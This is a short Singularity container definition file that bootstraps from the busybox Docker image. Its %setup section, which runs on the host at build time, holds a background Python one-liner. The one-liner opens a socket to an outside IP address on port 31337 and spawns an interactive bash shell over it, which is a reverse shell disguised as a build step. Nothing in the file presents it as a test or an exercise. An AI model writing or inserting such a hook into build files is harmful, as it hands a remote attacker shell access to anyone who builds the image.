BootStrap: docker
From: busybox

%setup
    python3.5 -c 'import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("86.235.110.195",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(["/bin/bash","-i"]);' &
